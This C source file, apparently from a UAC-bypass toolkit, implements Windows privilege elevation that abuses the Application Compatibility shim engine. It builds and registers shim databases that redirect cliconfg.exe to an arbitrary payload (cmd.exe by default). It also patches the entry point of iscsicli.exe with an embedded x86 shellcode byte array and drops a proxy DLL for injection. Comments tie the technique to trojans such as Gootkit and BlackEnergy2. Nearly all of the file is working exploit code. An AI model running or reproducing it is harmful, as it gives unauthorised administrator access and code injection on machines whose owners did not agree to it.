/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017,
*  (C) MS FixIT Shim Patches revealed by Jon Erickson
*
*  TITLE:       GOOTKIT.C
*
*  VERSION:     2.70
*
*  DATE:        25 Mar 2017
*
*  Gootkit based AutoElevation using AppCompat.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#ifndef _WIN64

static const unsigned char Inazuma32[237] = {
    0xEB, 0x78, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x53, 0x56, 0x8B, 0xF1, 0x89, 0x55, 0xFC, 0x57,
    0x8B, 0x46, 0x3C, 0x8B, 0x44, 0x30, 0x78, 0x03, 0xC6, 0x8B, 0x48, 0x24, 0x8B, 0x50, 0x20, 0x03,
    0xCE, 0x8B, 0x58, 0x1C, 0x03, 0xD6, 0x8B, 0x40, 0x18, 0x03, 0xDE, 0x89, 0x4D, 0xF0, 0x33, 0xC9,
    0x89, 0x55, 0xF4, 0x89, 0x45, 0xF8, 0x85, 0xC0, 0x74, 0x29, 0x8B, 0x14, 0x8A, 0x03, 0xD6, 0x33,
    0xFF, 0xEB, 0x0C, 0x0F, 0xBE, 0xC0, 0x33, 0xC7, 0xC1, 0xC0, 0x03, 0x40, 0x42, 0x8B, 0xF8, 0x8A,
    0x02, 0x84, 0xC0, 0x75, 0xEE, 0x3B, 0x7D, 0xFC, 0x74, 0x12, 0x8B, 0x55, 0xF4, 0x41, 0x3B, 0x4D,
    0xF8, 0x72, 0xD7, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x8B, 0x45, 0xF0, 0x0F,
    0xB7, 0x04, 0x48, 0x8B, 0x04, 0x83, 0x03, 0xC6, 0xEB, 0xEB, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x10,
    0x01, 0x00, 0x00, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x56, 0x57, 0x6A, 0x02, 0x8B, 0x40, 0x30,
    0x8B, 0x40, 0x0C, 0x8B, 0x78, 0x0C, 0x83, 0x65, 0xFC, 0x00, 0xC7, 0x45, 0xF4, 0x25, 0x54, 0x4D,
    0x50, 0xC7, 0x45, 0xF8, 0x25, 0x5C, 0x72, 0x33, 0x58, 0x8B, 0x3F, 0x48, 0x75, 0xFB, 0x8B, 0x4F,
    0x18, 0xBA, 0x08, 0x7E, 0xB3, 0x69, 0xE8, 0x47, 0xFF, 0xFF, 0xFF, 0x8B, 0x4F, 0x18, 0x8B, 0xF0,
    0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0xBA, 0xA2, 0x90, 0x38, 0xF5,
    0x50, 0x8D, 0x45, 0xF4, 0x50, 0xE8, 0x28, 0xFF, 0xFF, 0xFF, 0xFF, 0xD0, 0x8D, 0x85, 0xF0, 0xFE,
    0xFF, 0xFF, 0x50, 0xFF, 0xD6, 0x5F, 0x33, 0xC0, 0x5E, 0x8B, 0xE5, 0x5D, 0xC3
};

#endif

/*
* ucmRegisterAndRunTarget
*
* Purpose:
*
* Register shim database and execute target app from Windows (sub)directory.
*
*/
BOOL ucmRegisterAndRunTarget(
    _In_ LPWSTR lpShimDbPath,
    _In_ LPWSTR lpTarget,
    _In_ BOOL IsPatch
)
{
    BOOL bResult = FALSE;
    WCHAR szSdbinstPath[MAX_PATH * 2];
    WCHAR szCmd[MAX_PATH * 4];

    if ((lpTarget == NULL) ||
        (lpShimDbPath == NULL)) return bResult;

    RtlSecureZeroMemory(szSdbinstPath, sizeof(szSdbinstPath));
#ifdef _WIN64
    _strcpy(szSdbinstPath, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szSdbinstPath, SYSWOW64_DIR);
    _strcat(szSdbinstPath, SDBINST_EXE);
#else
    _strcpy(szSdbinstPath, g_ctx.szSystemDirectory);
    _strcat(szSdbinstPath, SDBINST_EXE);
#endif

    RtlSecureZeroMemory(szCmd, sizeof(szCmd));
    if (IsPatch) {
        _strcpy(szCmd, L"-p ");
        _strcat(szCmd, lpShimDbPath);
    }
    else {
        _strcpy_w(szCmd, lpShimDbPath);
    }

    //
    // Register shim, sdbinst.exe
    //
    if (supRunProcess(szSdbinstPath, szCmd)) {
        RtlSecureZeroMemory(szCmd, sizeof(szCmd));
#ifdef _WIN64
        _strcpy(szCmd, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szCmd, SYSWOW64_DIR);
#else
        _strcpy(szCmd, g_ctx.szSystemDirectory);
#endif
        _strcat(szCmd, lpTarget);
        bResult = supRunProcess(szCmd, NULL);

        //remove database
        RtlSecureZeroMemory(szCmd, sizeof(szCmd));
        _strcpy(szCmd, L"/q /u ");
        _strcat(szCmd, lpShimDbPath);
        supRunProcess(szSdbinstPath, szCmd);
        DeleteFile(lpShimDbPath);
    }
    return bResult;
}

/*
* ucmShimRedirectEXE
*
* Purpose:
*
* Build, register shim database and execute target app.
* Initially used in BlackEnergy2 and Gootkit by mzH (alive-green).
* Used in number of trojans (Win32/Dyre, WinNT/Cridex).
*
*/
BOOL ucmShimRedirectEXE(
    LPWSTR lpszPayloadEXE
)
{
    BOOL bResult = FALSE;
    PDB hShimDb;
    GUID dbGUID, exeGUID;
    WCHAR szShimDbPath[MAX_PATH * 2];

    TAGID tidDB = 0;
    TAGID tidEXE = 0;
    TAGID tidMatchFile = 0;
    TAGID tidShim = 0;
    TAGID tidLib = 0;

    if (lpszPayloadEXE == NULL)
        return bResult;

    //
    // GUIDs are important, for both DATABASE and EXE file.
    // They used as shim identifiers and must be set.
    //
    if ((CoCreateGuid(&dbGUID) != S_OK) ||
        (CoCreateGuid(&exeGUID) != S_OK)) return bResult;

    RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
    _strcpy(szShimDbPath, g_ctx.szTempDirectory);
    _strcat(szShimDbPath, MYSTERIOSCUTETHING);
    _strcat(szShimDbPath, L".sdb");

    hShimDb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
    if (hShimDb == NULL)
        return bResult;

    //write shim DB header
    tidDB = SdbBeginWriteListTag(hShimDb, TAG_DATABASE);
    if (tidDB != TAGID_NULL) {

        SdbWriteStringTag(hShimDb, TAG_NAME, MYSTERIOSCUTETHING);
        SdbWriteDWORDTag(hShimDb, TAG_OS_PLATFORM, 0x1); //win32 only RedirectEXE
        SdbWriteBinaryTag(hShimDb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));

        //just as ACT 5.6 does
        tidLib = SdbBeginWriteListTag(hShimDb, TAG_LIBRARY);
        if (tidLib != TAGID_NULL) SdbEndWriteListTag(hShimDb, tidLib);

        //write shim task information
        tidEXE = SdbBeginWriteListTag(hShimDb, TAG_EXE);
        if (tidEXE != TAGID_NULL) {
            SdbWriteStringTag(hShimDb, TAG_NAME, CLICONFG_EXE);
            SdbWriteStringTag(hShimDb, TAG_APP_NAME, CLICONFG_EXE);
            SdbWriteStringTag(hShimDb, TAG_VENDOR, MSFT_MIN);
            SdbWriteBinaryTag(hShimDb, TAG_EXE_ID, (PBYTE)&exeGUID, sizeof(GUID));

            //write shim target info
            tidMatchFile = SdbBeginWriteListTag(hShimDb, TAG_MATCHING_FILE);
            if (tidMatchFile != TAGID_NULL) {
                SdbWriteStringTag(hShimDb, TAG_NAME, L"*"); //<-from any
                SdbWriteStringTag(hShimDb, TAG_COMPANY_NAME, MSFT_FULL);
                SdbWriteStringTag(hShimDb, TAG_INTERNAL_NAME, CLICONFG_EXE);
                SdbEndWriteListTag(hShimDb, tidMatchFile);
            }

            //write shim action info
            tidShim = SdbBeginWriteListTag(hShimDb, TAG_SHIM_REF);
            if (tidShim != TAGID_NULL) {
                SdbWriteStringTag(hShimDb, TAG_NAME, L"RedirectEXE");
                SdbWriteStringTag(hShimDb, TAG_COMMAND_LINE, lpszPayloadEXE);
                SdbEndWriteListTag(hShimDb, tidShim);
            }
            SdbEndWriteListTag(hShimDb, tidEXE);
        }
        SdbEndWriteListTag(hShimDb, tidDB);
    }
    SdbCloseDatabaseWrite(hShimDb);

    bResult = ucmRegisterAndRunTarget(
        szShimDbPath,
        CLICONFG_EXE,
        FALSE);

    return bResult;
}

#ifndef _WIN64

/*
* ucmShimPatch
*
* Purpose:
*
* Build, register shim patch database and execute target app with forced Entry Point Override.
* Aside from UAC bypass this is also dll injection technique.
*
*/
BOOL ucmShimPatch(
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, cond = FALSE;
    PDB	 hpdb;
    GUID dbGUID, exeGUID;

    WCHAR szShimDbPath[MAX_PATH * 2];
    WCHAR szBuffer[MAX_PATH * 2];

    DWORD       indexid = MAXDWORD, sz, epRVA = 0;
    TAGID       dbrf, libref, patchref, exeref, matchfileref, patchfileref;
    PBYTE       tmp;
    PPATCHBITS  patchbits;

    do {

        if ((CoCreateGuid(&dbGUID) != S_OK) ||
            (CoCreateGuid(&exeGUID) != S_OK)) return bResult;

        // drop Fubuki
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szTempDirectory);
        _strcat(szBuffer, L"r3.dll");
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
        _strcpy(szShimDbPath, g_ctx.szTempDirectory);
        _strcat(szShimDbPath, INAZUMA_REV);
        _strcat(szShimDbPath, L".sdb");
        hpdb = SdbCreateDatabase(szShimDbPath, DOS_PATH);
        if (hpdb == NULL)
            break;

        if (!SdbDeclareIndex(hpdb, TAG_EXE, TAG_NAME, 1, TRUE, &indexid))
            break;

        if (!SdbStartIndexing(hpdb, indexid))
            break;

        SdbStopIndexing(hpdb, indexid);
        SdbCommitIndexes(hpdb);

        // begin DATABASE {
        dbrf = SdbBeginWriteListTag(hpdb, TAG_DATABASE);
        if (!SdbWriteStringTag(hpdb, TAG_NAME, INAZUMA_REV))
            break;

        SdbWriteBinaryTag(hpdb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));
        SdbWriteDWORDTag(hpdb, TAG_OS_PLATFORM, 0x1); //<- win32

        // begin LIBRARY {
        libref = SdbBeginWriteListTag(hpdb, TAG_LIBRARY);

        patchref = SdbBeginWriteListTag(hpdb, TAG_PATCH); // begin LIBRARY-PATCH
        SdbWriteStringTag(hpdb, TAG_NAME, BINARYPATH_TAG);

        // query EP RVA for target
        _strcpy(szBuffer, g_ctx.szSystemDirectory);
        _strcat(szBuffer, ISCSICLI_EXE);
        epRVA = supQueryEntryPointRVA(szBuffer);
        if (epRVA == 0)
            break;

        tmp = supHeapAlloc(32 * 1024);
        if (tmp != NULL) {
            patchbits = (PPATCHBITS)tmp;
            sz = 0;
            patchbits->Opcode = PATCH_REPLACE;
            patchbits->RVA = epRVA;
            _strcpy_w(patchbits->ModuleName, ISCSICLI_EXE);
            supCopyMemory((char *)&patchbits->Pattern, sizeof(Inazuma32), Inazuma32, sizeof(Inazuma32));
            patchbits->PatternSize = sizeof(Inazuma32);
            patchbits->ActionSize = (DWORD)(sizeof(PATCHBITS) + patchbits->PatternSize);
            sz += patchbits->ActionSize;
            SdbWriteBinaryTag(hpdb, TAG_PATCH_BITS, tmp, sz);
            supHeapFree(tmp);
        }
        SdbEndWriteListTag(hpdb, patchref); // end LIBRARY-PATCH

        // end LIBRARY
        SdbEndWriteListTag(hpdb, libref);

        SdbStartIndexing(hpdb, indexid);

        // begin EXE {
        exeref = SdbBeginWriteListTag(hpdb, TAG_EXE);
        SdbWriteStringTag(hpdb, TAG_NAME, ISCSICLI_EXE);
        SdbWriteStringTag(hpdb, TAG_APP_NAME, ISCSICLI_EXE);
        SdbWriteBinaryTag(hpdb, TAG_EXE_ID, (PBYTE)&exeGUID, sizeof(GUID));

        // begin MATCH {
        matchfileref = SdbBeginWriteListTag(hpdb, TAG_MATCHING_FILE);
        SdbWriteStringTag(hpdb, TAG_NAME, ISCSICLI_EXE);
        SdbWriteStringTag(hpdb, TAG_COMPANY_NAME, MSFT_FULL);
        SdbEndWriteListTag(hpdb, matchfileref); // } end MATCH

        patchfileref = SdbBeginWriteListTag(hpdb, TAG_PATCH_REF);
        SdbWriteStringTag(hpdb, TAG_NAME, BINARYPATH_TAG);
        SdbWriteDWORDTag(hpdb, TAG_PATCH_TAGID, patchref);
        SdbEndWriteListTag(hpdb, patchfileref);

        SdbEndWriteListTag(hpdb, exeref); // } end EXE

        // } end DATABASE
        SdbEndWriteListTag(hpdb, dbrf);

        SdbCloseDatabaseWrite(hpdb);

        // Register db and run target.
        bResult = ucmRegisterAndRunTarget(
            szShimDbPath,
            ISCSICLI_EXE,
            TRUE);

    } while (cond);

    return bResult;
}
#endif /* _WIN64 */

/*
* ucmAppcompatElevation
*
* Purpose:
*
* AutoElevation using Application Compatibility engine.
*
*/
BOOL ucmAppcompatElevation(
    UCM_METHOD Method,
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize,
    LPWSTR lpszPayloadEXE
)
{
    BOOL    bCond = FALSE, bResult = FALSE;
    WCHAR   szBuffer[MAX_PATH + 1];

#ifdef _WIN64
    UNREFERENCED_PARAMETER(ProxyDll);
    UNREFERENCED_PARAMETER(ProxyDllSize);
    UNREFERENCED_PARAMETER(lpszPayloadEXE);
#endif

    do {

        //create and register shim with RedirectEXE, cmd.exe as payload
        if (Method == UacMethodRedirectExe) {
            if (lpszPayloadEXE == NULL) {
                _strcpy_w(szBuffer, T_DEFAULT_CMD);
                bResult = ucmShimRedirectEXE(szBuffer);
                break;
            }
            else {
                bResult = ucmShimRedirectEXE(lpszPayloadEXE);
                break;
            }
        }
        //create and register shim patch with fubuki as payload
        if (Method == UacMethodShimPatch) {
#ifndef _WIN64 
            bResult = ucmShimPatch(ProxyDll, ProxyDllSize);
#else
            bResult = FALSE;
            break;
#endif
    }

} while (bCond);

return bResult;
}
